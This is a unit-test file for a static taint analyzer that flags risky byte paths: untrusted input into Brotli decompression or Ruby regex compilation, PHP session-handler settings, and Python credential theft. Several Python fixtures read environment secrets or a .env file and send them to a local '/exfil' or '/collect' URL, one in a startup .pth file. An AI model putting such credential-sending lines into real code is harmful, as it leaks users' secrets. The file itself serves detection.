/**
 * Tier 2 unit tests — dynamic byte-path taint analyzer (Handbook §6.2,
 * contract docs/CONTRACTS.md §3 / §10 TEST-03 fixtures inlined verbatim).
 * Pure: no fs, no network, no execution of fixture code.
 */
import { RiskLevel } from '@astram/types';
import { describe, expect, it } from 'vitest';
import {
  analyzeBytePathJs,
  analyzeBytePathPhp,
  analyzeBytePathPython,
  analyzeBytePathRuby,
  taintFactsFromSinks,
  type BytePathSinkKind,
  type TaintSink,
} from './bytepath-taint.js';

const APP = [
  `const express = require('express');`,
  `const zlib = require('zlib');`,
  ``,
  `const app = express();`,
  ``,
  `app.post('/upload', (req, res) => { const d = zlib.createBrotliDecompress(); req.pipe(d).pipe(res); });`,
].join('\n');

describe('analyzeBytePathJs — BROTLI sink (CVE-2026-111497)', () => {
  it('TEST-03 fixture shape: express handler piping req into createBrotliDecompress', () => {
    const sinks = analyzeBytePathJs(APP, 'app.js');
    const brotli = sinks.find((s) => s.kind === 'BROTLI');
    expect(brotli).toBeDefined();
    expect(brotli!.source).toBe('HTTP_REQUEST');
    expect(brotli!.file).toBe('app.js');
    expect(brotli!.line).toBe(6);
    expect(brotli!.snippet).toContain('createBrotliDecompress');
    expect(brotli!.detail).toContain('pipe');
  });

  it('direct tainted argument flow into brotliDecompressSync flags and notes the options object', () => {
    const code = [
      `const zlib = require('zlib');`,
      `app.post('/u', (req, res) => zlib.brotliDecompressSync(req.body, { chunkSize: 16384 }));`,
    ].join('\n');
    const sinks = analyzeBytePathJs(code, 'a.js');
    const brotli = sinks.find((s) => s.kind === 'BROTLI');
    expect(brotli).toBeDefined();
    expect(brotli!.source).toBe('HTTP_REQUEST');
    expect(brotli!.line).toBe(2);
    expect(brotli!.detail).toContain('options object present');
  });

  it('direct tainted argument into createBrotliDecompress(req.body) flags', () => {
    const code = `app.post('/u', (req, res) => { zlib.createBrotliDecompress(req.body); });`;
    const sinks = analyzeBytePathJs(code, 'a.js');
    expect(sinks.some((s) => s.kind === 'BROTLI' && s.source === 'HTTP_REQUEST')).toBe(true);
  });

  it('WebSocket message frame source flags (both callback arg flow and pipe)', () => {
    const argFlow = [
      `const zlib = require('zlib');`,
      `ws.on('message', (data) => { zlib.brotliDecompressSync(Buffer.from(data)); });`,
    ].join('\n');
    expect(analyzeBytePathJs(argFlow, 'ws.js').some((s) => s.kind === 'BROTLI' && s.source === 'WEBSOCKET_FRAME')).toBe(true);

    const pipeFlow = `socket.on('message', (frame) => { const dec = require('zlib').createBrotliDecompress(); frame.pipe(dec); });`;
    expect(analyzeBytePathJs(pipeFlow, 'ws.js').some((s) => s.kind === 'BROTLI' && s.source === 'WEBSOCKET_FRAME')).toBe(true);
  });

  it('BullMQ/Redis worker payload (job.data / job.payload) flags', () => {
    const data = `new Worker('queue', async (job) => { zlib.brotliDecompress(job.data); });`;
    expect(analyzeBytePathJs(data, 'w.js').some((s) => s.kind === 'BROTLI' && s.source === 'WORKER_PAYLOAD')).toBe(true);

    const payload = `new Worker('queue', async (job) => { zlib.brotliDecompressSync(job.payload); });`;
    expect(analyzeBytePathJs(payload, 'w.js').some((s) => s.kind === 'BROTLI' && s.source === 'WORKER_PAYLOAD')).toBe(true);
  });

  it('process.stdin piped into an inline createBrotliDecompress() flags', () => {
    const code = [
      `const zlib = require('zlib');`,
      `process.stdin.pipe(zlib.createBrotliDecompress());`,
    ].join('\n');
    const sinks = analyzeBytePathJs(code, 'stdin.js');
    expect(sinks.some((s) => s.kind === 'BROTLI' && s.source === 'STDIN' && s.line === 2)).toBe(true);
  });

  it('pipe flow across lines: sink reported at the pipe line, creation line in detail', () => {
    const code = [
      `const zlib = require('zlib');`,
      `app.post('/x', (req, res) => {`,
      `  const d = zlib.createBrotliDecompress();`,
      `  req.pipe(d);`,
      `});`,
    ].join('\n');
    const brotli = analyzeBytePathJs(code, 'm.js').find((s) => s.kind === 'BROTLI');
    expect(brotli).toBeDefined();
    expect(brotli!.line).toBe(4);
    expect(brotli!.detail).toContain('line 3');
  });

  it('negative: zlib on a static buffer does not flag', () => {
    const code = [
      `const zlib = require('zlib');`,
      `const out = zlib.brotliDecompressSync(Buffer.from('static data'));`,
      `const dec = zlib.createBrotliDecompress({ chunkSize: 1024 });`,
    ].join('\n');
    expect(analyzeBytePathJs(code, 'clean.js')).toHaveLength(0);
  });

  it('negative: non-tainted stream piped into a decompressor does not flag', () => {
    const code = [
      `const zlib = require('zlib');`,
      `app.post('/x', (req, res) => {`,
      `  const d = zlib.createBrotliDecompress({ chunkSize: 1024 });`,
      `  fs.createReadStream('x.bin').pipe(d);`,
      `});`,
    ].join('\n');
    expect(analyzeBytePathJs(code, 'clean.js')).toHaveLength(0);
  });

  it('negative: handler without any brotli call stays silent', () => {
    expect(analyzeBytePathJs(`app.post('/x', (req, res) => res.status(200).end());`, 'c.js')).toHaveLength(0);
  });

  it('regex fallback fires when the source does not parse', () => {
    const broken = [
      `function broken( {`,
      `const d = zlib.createBrotliDecompress();`,
      `req.pipe(d);`,
    ].join('\n');
    const sinks = analyzeBytePathJs(broken, 'broken.js');
    expect(sinks.some((s) => s.kind === 'BROTLI' && s.source === 'HTTP_REQUEST' && s.line === 3)).toBe(true);
  });
});

describe('analyzeBytePathRuby — RUBY_REGEXP sink (CVE-2026-110264)', () => {
  it('TEST-03 fixture shape: Regexp.compile(params[:q]) flags', () => {
    const rb = [
      `require 'sinatra'`,
      `get '/search' do`,
      `  pattern = Regexp.compile(params[:q])`,
      `end`,
    ].join('\n');
    const sinks = analyzeBytePathRuby(rb, 'leak.rb');
    const rx = sinks.find((s) => s.kind === 'RUBY_REGEXP');
    expect(rx).toBeDefined();
    expect(rx!.source).toBe('USER_INPUT');
    expect(rx!.line).toBe(3);
    expect(rx!.file).toBe('leak.rb');
  });

  it('Regexp.new(<identifier>) and Regexp.union(a, b) flag', () => {
    expect(analyzeBytePathRuby(`r = Regexp.new(user_pattern)`, 'l.rb').some((s) => s.kind === 'RUBY_REGEXP')).toBe(true);
    expect(analyzeBytePathRuby(`r = Regexp.union(a, b)`, 'l.rb').some((s) => s.kind === 'RUBY_REGEXP')).toBe(true);
  });

  it('double-quoted argument with #{...} interpolation flags', () => {
    const rb = `r = Regexp.compile("pre#{q}post")`;
    expect(analyzeBytePathRuby(rb, 'l.rb').some((s) => s.kind === 'RUBY_REGEXP')).toBe(true);
  });

  it("negative: Regexp.compile('literal') and plain double-quoted literals do not flag", () => {
    expect(analyzeBytePathRuby(`r = Regexp.compile('abc')`, 'l.rb')).toHaveLength(0);
    expect(analyzeBytePathRuby(`r = Regexp.new("abc")`, 'l.rb')).toHaveLength(0);
    expect(analyzeBytePathRuby(`r = Regexp.union(/^a/, :sym)`, 'l.rb')).toHaveLength(0);
  });

  it('Regexp.timeout guard does NOT suppress, but is recorded in detail', () => {
    const rb = [
      `Regexp.timeout = 3`,
      `pattern = Regexp.compile(params[:q])`,
    ].join('\n');
    const sinks = analyzeBytePathRuby(rb, 'leak.rb');
    const rx = sinks.find((s) => s.kind === 'RUBY_REGEXP');
    expect(rx).toBeDefined();
    expect(rx!.detail).toContain('Regexp.timeout');
    expect(rx!.detail).toContain('not suppressive');
  });
});

describe('analyzeBytePathPython — PTH_STARTUP + CRED_EXFIL_BYTEPATH', () => {
  const CHAIN = [
    `import os, urllib.request`,
    `key = os.environ.get('AEGIS_CANARY_SECRET_999', '')`,
    `urllib.request.urlopen(f'http://127.0.0.1/x?s={key}')`,
  ].join('\n');

  it('env read into var then urlopen f-string yields CRED_EXFIL_BYTEPATH at the egress line', () => {
    const sinks = analyzeBytePathPython(CHAIN, 'chain.py');
    const exfil = sinks.find((s) => s.kind === 'CRED_EXFIL_BYTEPATH');
    expect(exfil).toBeDefined();
    expect(exfil!.source).toBe('ENV_OR_FILE');
    expect(exfil!.line).toBe(3);
    expect(exfil!.detail).toContain("'key'");
    expect(exfil!.detail).toContain('line 2');
  });

  it('the same chain also yields PTH_STARTUP for the top-level egress call', () => {
    const sinks = analyzeBytePathPython(CHAIN, 'chain.py');
    const pth = sinks.find((s) => s.kind === 'PTH_STARTUP');
    expect(pth).toBeDefined();
    expect(pth!.line).toBe(3);
  });

  it('negative: env-read-only file yields no sinks', () => {
    const onlyEnv = ['import os', `key = os.environ.get('TOKEN', '')`].join('\n');
    expect(analyzeBytePathPython(onlyEnv, 'env.py')).toHaveLength(0);
  });

  it('.pth startup shape: import + exec/urlopen at top level is line-precise', () => {
    const pth = [
      `import os, urllib.request`,
      `urllib.request.urlopen("http://127.0.0.1:19999/exfil?s=" + os.environ.get("AEGIS_CANARY_SECRET_999", ""))`,
    ].join('\n');
    const sinks = analyzeBytePathPython(pth, 'evil_init.pth');
    expect(sinks.some((s) => s.kind === 'PTH_STARTUP' && s.line === 2)).toBe(true);
    expect(sinks.some((s) => s.kind === 'CRED_EXFIL_BYTEPATH' && s.line === 2)).toBe(true);
  });

  it('Path(".env") chain propagates taint through an intermediate variable', () => {
    const chain = [
      `from pathlib import Path`,
      `env_text = Path('.env').read_text()`,
      `token = env_text.split('\\n')[0]`,
      `requests.post('http://127.0.0.1/collect', data=token)`,
    ].join('\n');
    const exfil = analyzeBytePathPython(chain, 'dotenv.py').find((s) => s.kind === 'CRED_EXFIL_BYTEPATH');
    expect(exfil).toBeDefined();
    expect(exfil!.line).toBe(4);
    expect(exfil!.detail).toContain("Path('.env'...)");
  });

  it('open(".env") source is recognized; egress without any credential read is not joined', () => {
    const withEnv = [
      `secret = open('.env').read()`,
      `urllib.request.urlopen('http://127.0.0.1/x?s=' + secret)`,
    ].join('\n');
    expect(analyzeBytePathPython(withEnv, 'o.py').some((s) => s.kind === 'CRED_EXFIL_BYTEPATH')).toBe(true);

    const noCred = [`urllib.request.urlopen('http://127.0.0.1/ping')`].join('\n');
    expect(analyzeBytePathPython(noCred, 'o.py').some((s) => s.kind === 'CRED_EXFIL_BYTEPATH')).toBe(false);
  });

  it('negative: egress call that passes no tainted variable does not join', () => {
    const chain = [
      `import os`,
      `tok = os.getenv('API_KEY')`,
      `conn = socket.create_connection(('127.0.0.1', 9999))`,
      `conn.send(tok.encode())`,
    ].join('\n');
    // egress line 3 passes no tainted var; conn.send is not an egress pattern
    const sinks = analyzeBytePathPython(chain, 's.py').filter((s) => s.kind === 'CRED_EXFIL_BYTEPATH');
    expect(sinks).toHaveLength(0);
  });
});

describe('analyzeBytePathPhp — PHP_SESSION (session.upload_progress + serialize_handler)', () => {
  it('combined ini_set pair flags WARN with source INI', () => {
    const php = [
      `ini_set('session.upload_progress.enabled', '1');`,
      `ini_set('session.serialize_handler', 'php_serialize');`,
    ].join('\n');
    const sinks = analyzeBytePathPhp(php, 'app.php');
    expect(sinks).toHaveLength(1);
    expect(sinks[0]!.kind).toBe('PHP_SESSION');
    expect(sinks[0]!.source).toBe('INI');
    expect(sinks[0]!.line).toBe(2);
    expect(sinks[0]!.snippet).toContain('serialize_handler');
  });

  it('variable serialize_handler argument flags', () => {
    const php = [
      `ini_set('session.upload_progress.enabled', 1);`,
      `ini_set('session.serialize_handler', $cfg['handler']);`,
    ].join('\n');
    expect(analyzeBytePathPhp(php, 'a.php')).toHaveLength(1);
  });

  it('.htaccess php_value pair flags', () => {
    const htaccess = [
      `php_value session.upload_progress.enabled 1`,
      `php_value session.serialize_handler php_serialize`,
    ].join('\n');
    const sinks = analyzeBytePathPhp(htaccess, '.htaccess');
    expect(sinks).toHaveLength(1);
    expect(sinks[0]!.kind).toBe('PHP_SESSION');
    expect(sinks[0]!.line).toBe(2);
  });

  it('php.ini style pair flags', () => {
    const ini = ['session.upload_progress.enabled = 1', 'session.serialize_handler = php_serialize'].join('\n');
    expect(analyzeBytePathPhp(ini, 'php.ini')).toHaveLength(1);
  });

  it('negative: each side alone does not flag', () => {
    expect(analyzeBytePathPhp(`ini_set('session.upload_progress.enabled', '1');`, 'a.php')).toHaveLength(0);
    expect(analyzeBytePathPhp(`ini_set('session.serialize_handler', 'php_serialize');`, 'a.php')).toHaveLength(0);
  });

  it('negative: serialize_handler set to the default (php) does not flag', () => {
    const php = [
      `ini_set('session.upload_progress.enabled', '1');`,
      `ini_set('session.serialize_handler', 'php');`,
    ].join('\n');
    expect(analyzeBytePathPhp(php, 'a.php')).toHaveLength(0);
  });
});

describe('taintFactsFromSinks — BYTEPATH_* fact mapping', () => {
  it('maps kinds to ruleIds, holds HOLD except PHP_SESSION=WARN, dedupes', () => {
    const mk = (kind: BytePathSinkKind, file: string, line: number): TaintSink => ({
      kind,
      file,
      line,
      snippet: 's',
      source: 'X',
      detail: 'd',
    });
    const sinks = [
      mk('BROTLI', 'a.js', 2),
      mk('BROTLI', 'a.js', 2), // duplicate
      mk('RUBY_REGEXP', 'l.rb', 7),
      mk('CRED_EXFIL_BYTEPATH', 'c.py', 3),
      mk('PTH_STARTUP', 'p.pth', 2),
      mk('PHP_SESSION', 'x.php', 4),
    ];
    const facts = taintFactsFromSinks(sinks, 'fallback.js');
    expect(facts).toHaveLength(5);
    expect(facts.map((f) => f.ruleId)).toEqual([
      'BYTEPATH_BROTLI',
      'BYTEPATH_RUBY_REGEXP',
      'BYTEPATH_CRED_EXFIL_BYTEPATH',
      'BYTEPATH_PTH_STARTUP',
      'BYTEPATH_PHP_SESSION',
    ]);
    expect(facts.every((f) => f.category === 'BYTEPATH_SINK')).toBe(true);
    expect(facts.every((f) => f.deterministicRisk === RiskLevel.HOLD)).toBe(false);
    expect(facts.find((f) => f.ruleId === 'BYTEPATH_PHP_SESSION')!.deterministicRisk).toBe(RiskLevel.WARN);
    expect(facts.find((f) => f.ruleId === 'BYTEPATH_BROTLI')!.deterministicRisk).toBe(RiskLevel.HOLD);
  });

  it('uses the file argument when a sink carries no file', () => {
    const facts = taintFactsFromSinks(
      [{ kind: 'BROTLI', file: '', line: 1, snippet: 'x', source: 'HTTP_REQUEST', detail: 'd' }],
      'grouped-artifact'
    );
    expect(facts[0]!.file).toBe('grouped-artifact');
  });
});
